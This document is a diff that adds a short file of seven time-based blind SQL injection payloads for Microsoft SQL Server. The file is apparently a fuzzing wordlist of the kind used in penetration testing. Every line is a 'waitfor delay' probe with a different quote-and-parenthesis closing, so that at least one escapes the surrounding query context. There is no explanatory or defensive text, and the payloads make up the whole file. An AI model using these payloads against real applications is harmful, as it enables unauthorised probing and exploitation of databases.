@@ -1,0 +1,7 @@
+1 waitfor delay '0:0:X'--
+1; waitfor delay '0:0:X'--
+1'; waitfor delay '0:0:X'--
+1); waitfor delay '0:0:X'--
+1)); waitfor delay '0:0:X'--
+1'); waitfor delay '0:0:X'--
+1')); waitfor delay '0:0:X'--
